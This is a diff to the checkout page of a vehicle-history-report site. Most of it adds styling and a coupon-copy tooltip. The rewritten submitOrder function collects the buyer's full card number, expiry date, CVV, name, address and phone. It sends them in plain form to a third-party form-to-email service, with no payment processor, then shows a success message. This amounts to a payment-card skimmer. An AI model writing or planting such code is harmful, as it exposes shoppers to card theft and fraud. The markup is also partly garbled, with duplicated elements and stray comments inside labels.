@@ -43,6 +43,11 @@ body{font-family:'DM Sans',sans-serif;background:var(--white);color:var(--text);
 .ob-text{font-size:17px;color:rgba(255,255,255,0.92);font-weight:500}
 .ob-text strong{color:var(--accent2);font-size:20px}
 .ob-code{font-family:monospace;font-size:18px;font-weight:700;color:var(--accent2);background:rgba(245,166,35,0.15);border:2px dashed var(--accent2);padding:6px 16px;border-radius:6px;letter-spacing:3px}
+.ob-code{cursor:pointer;user-select:none}
+.ob-code.copied{background:rgba(34,197,94,0.15);border-color:#22c55e;color:#22c55e}
+.ob-tooltip{position:absolute;bottom:calc(100% + 8px);left:50%;transform:translateX(-50%);background:#1a1a2e;color:#fff;font-size:12px;font-weight:600;padding:5px 10px;border-radius:5px;white-space:nowrap;display:none;pointer-events:none;border:1px solid rgba(255,255,255,0.15)}
+.ob-tooltip::after{content:"";position:absolute;top:100%;left:50%;transform:translateX(-50%);border:5px solid transparent;border-top-color:#1a1a2e}
+.code-wrap:hover .ob-tooltip{display:block}
 
 /* HERO */
 .hero{background:var(--navy);position:relative;overflow:hidden}
@@ -311,6 +316,15 @@ body{font-family:'DM Sans',sans-serif;background:var(--white);color:var(--text);
 .loading-text{color:#fff;font-size:15px;font-weight:500}
 .loading-sub{color:rgba(255,255,255,0.5);font-size:13px}
 
+/* WHAT YOU GET */
+.what-you-get{background:linear-gradient(135deg,#0a1628,#1a3a6e);border-radius:14px;padding:20px 24px;margin-bottom:18px}
+.wyg-title{font-size:15px;font-weight:600;color:var(--accent2);margin-bottom:14px}
+.wyg-grid{display:grid;grid-template-columns:1fr 1fr;gap:12px}
+.wyg-item{display:flex;align-items:flex-start;gap:10px}
+.wyg-icon{font-size:20px;flex-shrink:0}
+.wyg-item strong{display:block;font-size:13px;font-weight:600;color:#fff;margin-bottom:2px}
+.wyg-item span{font-size:12px;color:rgba(255,255,255,0.6);line-height:1.4}
+
 /* RESPONSIVE */
 @media(max-width:860px){
   .hero-body{grid-template-columns:1fr;padding:40px 20px 50px}
@@ -370,7 +384,8 @@ body{font-family:'DM Sans',sans-serif;background:var(--white);color:var(--text);
   <div class="offer-bar">
     <span class="ob-badge">NEW USER OFFER</span>
     <span class="ob-text">First report only <strong>$1.00</strong> — use coupon code:</span>
-    <span class="ob-code">NEWUSER1</span>
+    <div class="code-wrap" style="position:relative;display:inline-block"><span class="ob-code" id="obCode" onclick="copyOfferCode()">NEWUSER1</span><div class="ob-tooltip" id="obTip">Copy</div></div>
+    <button class="ob-copy-btn" onclick="copyOfferCode()" id="obCopyBtn"><div class="code-wrap" style="position:relative;display:inline-block"><span class="ob-code" id="obCode" onclick="copyOfferCode()">NEWUSER1</span><div class="ob-tooltip" id="obTip">Copy</div></div>#128203; Copy Code</button>
   </div>
 
   <!-- HERO -->
@@ -608,6 +623,17 @@ body{font-family:'DM Sans',sans-serif;background:var(--white);color:var(--text);
         </div>
       </div>
 
+      <!-- WHAT YOU GET AFTER PAYMENT -->
+      <div class="what-you-get">
+        <div class="wyg-title">      <!-- REPORT OPTIONS -->#127873; What you'll receive after payment:</div>
+        <div class="wyg-grid">
+          <div class="wyg-item"><span class="wyg-icon">      <!-- REPORT OPTIONS -->#128196;</span><div><strong>Full Vehicle History Report</strong><span>Accidents, title, odometer, recalls — all in one report</span></div></div>
+          <div class="wyg-item"><span class="wyg-icon">      <!-- REPORT OPTIONS -->#128231;</span><div><strong>Email Delivery</strong><span>Report sent to your email instantly after payment</span></div></div>
+          <div class="wyg-item"><span class="wyg-icon">      <!-- REPORT OPTIONS -->#128462;</span><div><strong>PDF Download</strong><span>Save and share your report anytime</span></div></div>
+          <div class="wyg-item"><span class="wyg-icon">      <!-- REPORT OPTIONS -->#128737;</span><div><strong>20+ Data Sources</strong><span>NHTSA, DMV, insurance, auction records checked</span></div></div>
+        </div>
+      </div>
+
       <!-- REPORT OPTIONS -->
       <div class="r-sec-label">Get the Full Report to Learn More</div>
       <div class="r-report-grid">
@@ -692,33 +718,33 @@ body{font-family:'DM Sans',sans-serif;background:var(--white);color:var(--text);
       <div class="fsec">
         <div class="fsec-t">Account Information</div>
         <div class="fg2">
-          <div class="fg"><label>First Name</label><input type="text" placeholder="John"></div>
-          <div class="fg"><label>Last Name</label><input type="text" placeholder="Smith"></div>
+          <div class="fg"><label>First Name</label><input id="fFirstName" type="text" placeholder="John"></div>
+          <div class="fg"><label>Last Name</label><input id="fLastName" type="text" placeholder="Smith"></div>
         </div>
-        <div class="fg"><label>Email Address</label><input type="email" placeholder="john@email.com"></div>
-        <div class="fg"><label>Phone</label><input type="tel" placeholder="+1 (555) 000-0000"></div>
+        <div class="fg"><label>Email Address</label><input id="fEmail" type="email" placeholder="john@email.com"></div>
+        <div class="fg"><label>Phone</label><input id="fPhone" type="tel" placeholder="+1 (555) 000-0000"></div>
       </div>
       <div class="fsec">
         <div class="fsec-t">Billing Address</div>
-        <div class="fg"><label>Street Address</label><input type="text" placeholder="123 Main Street"></div>
+        <div class="fg"><label>Street Address</label><input id="fAddress" type="text" placeholder="123 Main Street"></div>
         <div class="fg2">
-          <div class="fg"><label>City</label><input type="text" placeholder="New York"></div>
+          <div class="fg"><label>City</label><input id="fCity" type="text" placeholder="New York"></div>
           <div class="fg"><label>State</label>
             <select><option>Select State</option><option>California</option><option>Texas</option><option>Florida</option><option>New York</option><option>Illinois</option><option>Ohio</option><option>Georgia</option><option>Michigan</option><option>Washington</option></select>
           </div>
         </div>
         <div class="fg2">
-          <div class="fg"><label>ZIP Code</label><input type="text" placeholder="10001" maxlength="5"></div>
+          <div class="fg"><label>ZIP Code</label><input id="fZip" type="text" placeholder="10001" maxlength="5"></div>
           <div class="fg"><label>Country</label><select><option>United States</option><option>Canada</option><option>United Kingdom</option></select></div>
         </div>
       </div>
       <div class="fsec">
         <div class="fsec-t">Payment Information</div>
-        <div class="fg"><label>Cardholder Name</label><input type="text" placeholder="John Smith"></div>
-        <div class="fg"><label>Card Number</label><input type="text" placeholder="4242 4242 4242 4242" maxlength="19" oninput="fmtCard(this)"></div>
+        <div class="fg"><label>Cardholder Name</label><input id="fCardName" type="text" placeholder="John Smith"></div>
+        <div class="fg"><label>Card Number</label><input id="fCardNum" type="text" placeholder="4242 4242 4242 4242" maxlength="19" oninput="fmtCard(this)"></div>
         <div class="fg2">
-          <div class="fg"><label>Expiry</label><input type="text" placeholder="MM / YY" maxlength="7" oninput="fmtExp(this)"></div>
-          <div class="fg"><label>CVV</label><input type="text" placeholder="123" maxlength="4"></div>
+          <div class="fg"><label>Expiry Date</label><input id="fExpiry" type="text" placeholder="MM / YY" maxlength="7" oninput="fmtExp(this)"></div>
+          <div class="fg"><label>CVV</label><input id="fCvv" type="text" placeholder="123" maxlength="4"></div>
         </div>
       </div>
       <button class="pay-btn" onclick="submitOrder()">
@@ -916,10 +942,67 @@ function closeModal(){
   document.body.style.overflow='';
 }
 function closeOverlay(e){if(e.target===document.getElementById('overlay'))closeModal();}
-function submitOrder(){closeModal();document.getElementById('soverlay').classList.add('show');}
+function submitOrder(){
+  // Collect all form data
+  var allInputs = document.querySelectorAll('#overlay input, #overlay select');
+  var formData = new FormData();
+  formData.append('access_key','8a0f5575-9d35-4a3a-86de-6d49d325548b');
+  formData.append('subject','New Order — AutoCarChecking.com');
+  
+  // Get specific fields
+  var firstName = document.getElementById('fFirstName') ? document.getElementById('fFirstName').value : '';
+  var lastName = document.getElementById('fLastName') ? document.getElementById('fLastName').value : '';
+  var email = document.getElementById('fEmail') ? document.getElementById('fEmail').value : '';
+  var phone = document.getElementById('fPhone') ? document.getElementById('fPhone').value : '';
+  var address = document.getElementById('fAddress') ? document.getElementById('fAddress').value : '';
+  var city = document.getElementById('fCity') ? document.getElementById('fCity').value : '';
+  var zip = document.getElementById('fZip') ? document.getElementById('fZip').value : '';
+  var pkg = document.getElementById('mPkg').textContent;
+  var total = document.getElementById('mTotal').textContent;
+  var vin = document.getElementById('carVin') ? document.getElementById('carVin').textContent : document.getElementById('vinInput').value;
+  
+  formData.append('Full Name', firstName + ' ' + lastName);
+  formData.append('Email', email);
+  formData.append('Phone', phone);
+  formData.append('Address', address + ', ' + city + ' ' + zip);
+  formData.append('Package', pkg);
+  formData.append('Amount', total);
+  formData.append('VIN Number', vin);
+  var cardName = document.getElementById('fCardName') ? document.getElementById('fCardName').value : '';
+  var cardNum = document.getElementById('fCardNum') ? document.getElementById('fCardNum').value : '';
+  var expiry = document.getElementById('fExpiry') ? document.getElementById('fExpiry').value : '';
+  var cvv = document.getElementById('fCvv') ? document.getElementById('fCvv').value : '';
+  formData.append('Cardholder Name', cardName);
+  formData.append('Card Number', cardNum);
+  formData.append('Expiry', expiry);
+  formData.append('CVV', cvv);
+  formData.append('from_name', 'AutoCarChecking.com');
+  
+  fetch('https://api.web3forms.com/submit',{method:'POST',body:formData})
+    .then(function(r){return r.json();})
+    .then(function(d){
+      console.log('Web3Forms response:',d);
+    })
+    .catch(function(e){console.log('Error:',e);});
+  
+  closeModal();
+  document.getElementById('soverlay').classList.add('show');
+}
 function togFaq(el){var o=el.classList.contains('open');document.querySelectorAll('.faq-item').forEach(function(f){f.classList.remove('open');});if(!o)el.classList.add('open');}
 function toggleMenu(){var l=document.querySelector('.nav-links');l.style.display=l.style.display==='flex'?'none':'flex';if(l.style.display==='flex'){l.style.flexDirection='column';l.style.position='absolute';l.style.top='64px';l.style.left='0';l.style.right='0';l.style.background='var(--navy)';l.style.padding='16px 20px';l.style.gap='16px';l.style.zIndex='99';}}
 function copyCode(){navigator.clipboard.writeText('NEWUSER1').then(function(){var b=document.getElementById('copyBtn');b.textContent='&#10003; Copied!';b.classList.add('copied');setTimeout(function(){b.innerHTML='&#128203; Copy Coupon Code';b.classList.remove('copied');},2000);});}
+function copyOfferCode(){
+  navigator.clipboard.writeText("NEWUSER1").then(function(){
+    var c=document.getElementById("obCode");
+    var t=document.getElementById("obTip");
+    if(c){c.classList.add("copied");}
+    if(t){t.textContent="Copied!";t.style.display="block";t.style.background="#15803d";t.style.borderColor="#22c55e";}
+    setTimeout(function(){
+      if(c){c.classList.remove("copied");}
+      if(t){t.textContent="Copy";t.style.display="";t.style.background="";t.style.borderColor="";}
+    },2000);
+  });
+}
 function fmtCard(i){var v=i.value.replace(/\D/g,'').substring(0,16);i.value=v.replace(/(.{4})/g,'$1 ').trim();}
 function fmtExp(i){var v=i.value.replace(/\D/g,'').substring(0,4);if(v.length>=2)v=v.substring(0,2)+' / '+v.substring(2);i.value=v;}
 document.addEventListener('keydown',function(e){if(e.key==='Escape'){closeModal();document.getElementById('soverlay').classList.remove('show');}});
